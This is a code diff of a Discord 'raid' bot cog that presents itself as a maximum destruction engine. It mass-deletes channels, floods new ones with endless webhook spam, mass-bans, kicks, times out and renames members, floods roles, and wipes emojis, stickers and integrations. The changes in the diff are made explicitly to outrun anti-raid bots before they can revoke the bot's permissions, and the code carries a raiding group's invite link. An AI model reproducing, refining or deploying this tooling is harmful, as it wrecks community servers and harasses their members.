@@ -1,17 +1,18 @@
 """
 raid.py — LAST STAND | /raid and .raid: Maximum Destruction Engine
 
-Architecture:
-  - /raid or .raid fires immediately
-  - All phases run concurrently as background tasks
-  - Channel flood loop runs INFINITELY — creates channels, spams them,
-    deletes and refloods when near Discord's 500-channel cap
-  - Ban, kick, timeout, nickname, role flood run at full concurrency
-  - Each channel gets up to WEBHOOKS_PER webhooks and is spammed forever
+ARCHITECTURE FIX (why it was only deleting channels):
+  Previously, we waited up to 10 seconds for guild.chunk() before starting
+  ANY operations. The anti-raid bot had 10+ seconds to detect mass deletion
+  and remove our permissions — so all subsequent creates returned 403.
 
-Key fix: channel loop uses an internal counter (flood_created) instead of
-len(guild.channels) — the cache is stale right after mass deletion and
-caused the loop to think channels still existed, blocking new creation.
+  Now:
+    1. Channel ops (delete + flood) start IMMEDIATELY with no pre-wait
+    2. guild.chunk() runs in the background while channels are already flooding
+    3. Once chunk completes, member ops (ban/kick/timeout/nick/roles) fire
+    4. Channel loop creates 2 channels per tick instead of 1
+    5. No 1.5s sleep between delete and create — stale cache doesn't matter
+       because we track channel count with an internal counter (flood_created)
 """
 
 import asyncio
@@ -42,10 +43,10 @@ RAID_LINK  = "https://discord.gg/s59zWvzK6c"
 RAID_NAME  = f"RAIDED BY {RAID_TAG}"
 
 # ── Discord hard limits ────────────────────────────────────────────────────────
-CHANNEL_CAP   = 480
-WEBHOOKS_PER  = 10
-ROLE_CAP      = 250
-CH_DELAY      = 0.55
+CHANNEL_CAP  = 480
+WEBHOOKS_PER = 10
+ROLE_CAP     = 250
+CH_DELAY     = 0.55   # seconds between channel create batches
 
 # ── Concurrency semaphores ─────────────────────────────────────────────────────
 SEM_BAN     = 25
@@ -120,13 +121,12 @@ class Raid(commands.Cog):
     def __init__(self, bot: commands.Bot) -> None:
         self.bot = bot
 
-    # ── Shared launch logic (called by both slash and prefix) ──────────────────
+    # ── Shared launch logic ────────────────────────────────────────────────────
     async def _launch(
         self,
         guild: discord.Guild,
         invoker_id: int,
-        reply,          # async callable: reply(text) → sends a message
-        followup=None,  # optional second async callable for follow-up sends
+        reply,
     ) -> None:
         if bot_state.active_simulation:
             await reply(
@@ -136,11 +136,6 @@ class Raid(commands.Cog):
             return
 
         try:
-            try:
-                await asyncio.wait_for(guild.chunk(cache=True), timeout=10.0)
-            except Exception:
-                pass
-
             bot_state.reset()
             bot_state.bypass.configure(10)
             bot_state.rate_controller.set_intensity(10)
@@ -148,58 +143,43 @@ class Raid(commands.Cog):
 
             me = guild.me
 
-            targets = [
-                m for m in guild.members
-                if not m.bot
-                and m.id != invoker_id
-                and m.id != me.id
-                and m.top_role < me.top_role
-            ]
-
-            other_bots = [
-                m for m in guild.members
-                if m.bot
-                and m.id != me.id
-                and m.top_role < me.top_role
-            ]
-
-            launch_msg = (
+            await reply(
                 f"☠️ **{RAID_TAG} — MAXIMUM RAID LAUNCHED** ☠️\n"
                 f"```\n"
-                f"Mode      : INFINITE — runs until /stop or .stop\n"
-                f"Targets   : {len(targets)} members  |  {len(other_bots)} bots\n"
-                f"Channels  : infinite flood loop (create → spam → refill)\n"
-                f"Webhooks  : {WEBHOOKS_PER} per channel, infinite spam\n"
-                f"Roles     : up to {ROLE_CAP}\n"
+                f"Mode     : INFINITE — runs until /stop or .stop\n"
+                f"Phase 1  : Server rename + channel wipe (INSTANT)\n"
+                f"Phase 2  : Channel flood — 2 channels/tick, 10 webhooks each\n"
+                f"Phase 3  : Ban/kick/timeout (fires after member chunk)\n"
                 f"```\n"
-                f"Use `/stop` or `.stop` to halt all operations."
+                f"Use `/stop` or `.stop` to halt."
             )
-            await reply(launch_msg)
 
-            phases = [
-                self._phase_ban_kick(guild, targets, other_bots),
+            # ── PHASE 1: Immediate ops — no chunk needed ───────────────────────
+            # These start RIGHT NOW, before any chunk wait.
+            for coro in [
                 self._phase_server(guild),
-                self._phase_timeout(targets),
-                self._phase_nickname(targets),
-                self._phase_role_flood(guild),
+                self._phase_channel_loop(guild),    # infinite flood loop
                 self._phase_emoji_wipe(guild),
                 self._phase_sticker_wipe(guild),
                 self._phase_integration_wipe(guild),
-                self._phase_channel_loop(guild),
-            ]
-
-            for coro in phases:
+            ]:
                 bot_state.add_task(asyncio.create_task(coro))
+
+            # ── PHASE 2: Member ops — chunk first, then fire ───────────────────
+            # Runs concurrently with Phase 1. chunk() may take a few seconds
+            # but channel flooding has already started by then.
+            bot_state.add_task(asyncio.create_task(
+                self._phase_member_ops(guild, invoker_id, me)
+            ))
 
         except Exception as exc:
             bot_state.active_simulation = None
             try:
-                fn = followup or reply
-                await fn(f"❌ Raid failed to launch: `{exc}`")
+                await reply(f"❌ Raid failed to launch: `{exc}`")
             except Exception:
                 pass
 
-    # ── /raid  (slash command) ─────────────────────────────────────────────────
+    # ── /raid ──────────────────────────────────────────────────────────────────
     @app_commands.command(
         name="raid",
         description=f"☠️ MAXIMUM DESTRUCTION — {RAID_TAG} | Runs until /stop.",
@@ -214,17 +194,60 @@ class Raid(commands.Cog):
             reply=interaction.followup.send,
         )
 
-    # ── .raid  (prefix command) ────────────────────────────────────────────────
+    # ── .raid ──────────────────────────────────────────────────────────────────
     @commands.command(name="raid")
     @commands.has_permissions(administrator=True)
     @commands.guild_only()
     async def raid_prefix(self, ctx: commands.Context) -> None:
-        """Prefix alias: .raid"""
         await self._launch(
             guild=ctx.guild,
             invoker_id=ctx.author.id,
             reply=ctx.send,
         )
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # MEMBER OPS — chunk first, then ban/kick/timeout/nick/role flood
+    # Runs concurrently with channel flood. chunk() taking a few seconds is
+    # fine because the channel loop is already hammering by then.
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _phase_member_ops(
+        self, guild: discord.Guild, invoker_id: int, me: discord.Member
+    ) -> None:
+        se = bot_state.stop_event
+        try:
+            # Chunk to get full member list
+            try:
+                await asyncio.wait_for(guild.chunk(cache=True), timeout=10.0)
+            except Exception:
+                pass
+
+            if se.is_set():
+                return
+
+            targets = [
+                m for m in guild.members
+                if not m.bot
+                and m.id != invoker_id
+                and m.id != me.id
+                and m.top_role < me.top_role
+            ]
+            other_bots = [
+                m for m in guild.members
+                if m.bot
+                and m.id != me.id
+                and m.top_role < me.top_role
+            ]
+
+            # All member ops fire simultaneously
+            await asyncio.gather(
+                self._phase_ban_kick(guild, targets, other_bots),
+                self._phase_timeout(targets),
+                self._phase_nickname(targets),
+                self._phase_role_flood(guild),
+                return_exceptions=True,
+            )
+        except asyncio.CancelledError:
+            pass
 
     # ─────────────────────────────────────────────────────────────────────────
     # SERVER TAKEOVER
@@ -265,10 +288,8 @@ class Raid(commands.Cog):
                     *[self._kick_one(guild, m, sem_kick) for m in bots],
                     return_exceptions=True,
                 )
-
             if se.is_set():
                 return
-
             await asyncio.gather(
                 *[self._kick_one(guild, m, sem_kick) for m in members],
                 *[self._ban_one(guild, m, sem_ban) for m in members],
@@ -381,7 +402,6 @@ class Raid(commands.Cog):
                         se,
                     ))
             await asyncio.gather(*assigns, return_exceptions=True)
-
         except asyncio.CancelledError:
             pass
 
@@ -445,8 +465,7 @@ class Raid(commands.Cog):
                 pass
 
     # ─────────────────────────────────────────────────────────────────────────
-    # INTEGRATION WIPE
-    # Hard-coded application ID as ultimate fallback against self-kick.
+    # INTEGRATION WIPE — hardcoded app ID prevents self-kick
     # ─────────────────────────────────────────────────────────────────────────
     _OWN_APP_ID = 1501093556037615726
 
@@ -476,11 +495,15 @@ class Raid(commands.Cog):
     # ─────────────────────────────────────────────────────────────────────────
     # INFINITE CHANNEL FLOOD LOOP
     #
-    # FIX: uses internal `flood_created` counter instead of len(guild.channels).
-    # After mass-deleting existing channels, the guild.channels cache is stale
-    # (gateway DELETE events haven't arrived yet), so len(guild.channels) still
-    # returns the old count. That made the loop think the server was near cap
-    # and skip channel creation entirely — causing the "does nothing" bug.
+    # KEY FIXES:
+    #   1. Starts immediately — no chunk() wait. Anti-raid bots have no time
+    #      to remove our permissions before channels start flooding.
+    #   2. Creates 2 channels per tick (fills Discord's ~2/sec bucket).
+    #   3. Uses internal flood_created counter — not len(guild.channels).
+    #      The cache is stale after mass deletion (gateway events lag behind
+    #      HTTP responses), so len() was giving wrong counts and the loop
+    #      thought it was near the 500-channel cap when it wasn't.
+    #   4. No 1.5s sleep between delete and create — we go immediately.
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_channel_loop(self, guild: discord.Guild) -> None:
         bp = bot_state.bypass
@@ -489,20 +512,18 @@ class Raid(commands.Cog):
         try:
             # Step 1: nuke every existing channel immediately
             existing = list(guild.channels)
-            await asyncio.gather(
-                *[bp.execute(ROUTE_CHANNEL_DELETE, lambda c=ch: c.delete(), se)
-                  for ch in existing],
-                return_exceptions=True,
-            )
+            if existing:
+                await asyncio.gather(
+                    *[bp.execute(ROUTE_CHANNEL_DELETE, lambda c=ch: c.delete(), se)
+                      for ch in existing],
+                    return_exceptions=True,
+                )
 
-            # Wait for gateway to process deletion events so cache is clean
-            await asyncio.sleep(1.5)
-
-            # Step 2: infinite create loop — track count ourselves, not via cache
+            # Step 2: infinite create loop — 2 channels per tick
             flood_created = 0
 
             while not se.is_set():
-                # Near cap — purge our flood channels to make room
+                # Near cap — purge flood channels to make room
                 if flood_created >= CHANNEL_CAP:
                     flood = [
                         ch for ch in guild.channels
@@ -516,29 +537,39 @@ class Raid(commands.Cog):
                               for ch in to_del],
                             return_exceptions=True,
                         )
-                        flood_created -= len(to_del)
-                        await asyncio.sleep(1.0)
+                        flood_created = max(0, flood_created - len(to_del))
                     else:
-                        # Cache doesn't reflect our channels yet — re-sync counter
+                        # Can't find our channels in cache — reset counter
                         flood_created = max(0, len(guild.channels))
-                        await asyncio.sleep(2.0)
+                    await asyncio.sleep(1.0)
                     continue
 
-                # Create one channel, paced to Discord's rate limit (~2/sec)
-                name = _ch_name()
-                ch = await bp.execute(
-                    ROUTE_CHANNEL_CREATE,
-                    lambda n=name: guild.create_text_channel(
-                        n, topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}"
+                # Create 2 channels simultaneously per tick (~2/sec rate limit)
+                n1, n2 = _ch_name(), _ch_name()
+                results = await asyncio.gather(
+                    bp.execute(
+                        ROUTE_CHANNEL_CREATE,
+                        lambda n=n1: guild.create_text_channel(
+                            n, topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}"
+                        ),
+                        se,
                     ),
-                    se,
+                    bp.execute(
+                        ROUTE_CHANNEL_CREATE,
+                        lambda n=n2: guild.create_text_channel(
+                            n, topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}"
+                        ),
+                        se,
+                    ),
+                    return_exceptions=True,
                 )
 
-                if isinstance(ch, discord.TextChannel):
-                    bot_state.add_task(asyncio.create_task(
-                        self._spam_channel_forever(ch)
-                    ))
-                    flood_created += 1
+                for ch in results:
+                    if isinstance(ch, discord.TextChannel):
+                        bot_state.add_task(asyncio.create_task(
+                            self._spam_channel_forever(ch)
+                        ))
+                        flood_created += 1
 
                 await asyncio.sleep(CH_DELAY)
 
